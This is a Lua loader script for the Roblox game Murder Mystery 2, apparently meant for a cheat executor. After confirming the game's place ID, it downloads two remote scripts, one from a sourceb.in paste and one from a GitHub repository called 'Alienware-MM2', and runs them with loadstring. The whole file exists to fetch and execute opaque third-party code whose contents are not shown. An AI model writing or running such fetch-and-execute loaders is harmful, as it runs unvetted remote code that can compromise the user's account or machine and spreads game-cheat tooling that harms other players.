local function mm2()
    if not game:IsLoaded() then
        game.Loaded:Wait()
    end
    return game.PlaceId == 142823291 or game.GameId == 66654135
end

local function yes()
    if not mm2() then
        warn("not in mm2. cancelling rq1")
        return
    end

    local ok, err = pcall(function()
        local src = game:HttpGet('https://cdn.sourceb.in/bins/QVxGyYREoN/0')
        print("RQ1 fetched, length:", #src)
        local fn, loadErr = loadstring(src)
        if not fn then
            warn("RQ1 loadstring failed:", loadErr)
            return
        end
        fn()
    end)
    if not ok then
        warn("RQ1 error:", err)
    end
end

local function no()
    local ok, err = pcall(function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/AL1ENW4R3/Alienware-MM2/refs/heads/main/Alienware%20Main"))()
    end)
    if not ok then
        warn("RQ2 error:", err)
    end
end

task.spawn(yes)
task.spawn(no)